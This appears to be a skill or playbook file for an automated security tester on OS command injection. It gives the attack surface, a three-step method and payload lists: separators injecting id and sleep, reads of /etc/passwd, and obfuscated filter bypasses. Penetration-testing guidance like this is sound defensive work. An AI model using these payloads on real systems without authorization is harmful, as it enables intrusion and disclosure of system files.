---
name: command_injection
description: OS Command Injection testing
category: injection
bug_class: command_injection
triggers:
  - command injection
  - os command
  - rce
  - remote code execution
  - shell injection
---

# OS Command Injection Testing

## Key Insight
Command injection occurs when user input is passed to system commands without proper sanitization, allowing an attacker to execute arbitrary OS commands.

## Attack Surface
- Form inputs that trigger system commands (ping, nslookup, traceroute)
- File upload functionality
- URL parameters used in system calls
- HTTP headers used in logging or processing

## Methodology
1. **Detection**: Inject command separators and check for execution
2. **Blind Testing**: Use time-based or OOB techniques
3. **Validation**: Confirm with safe output commands

## Detection Payloads

### Command Separators
```
; id
| id
|| id
&& id
`id`
$(id)
; sleep 5
| sleep 5
```

### Time-Based (Blind)
```
; sleep 10
| sleep 10
&& sleep 10
; ping -c 10 127.0.0.1
```

### Output-Based
```
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
; id
```

### Encoded Bypass
```
; c'a't /etc/passwd
; cat /etc/pas??d
; {cat,/etc/passwd}
```

## Validation
- Time-based: Response delayed by exact sleep duration
- Output-based: `/etc/passwd` content or `uid=` in response
- OOB: Callback to external server

## False Positive Avoidance
- Time-based: Test multiple times to confirm consistency
- Output: Verify the output is from the target, not cached
- Check if command separators are filtered
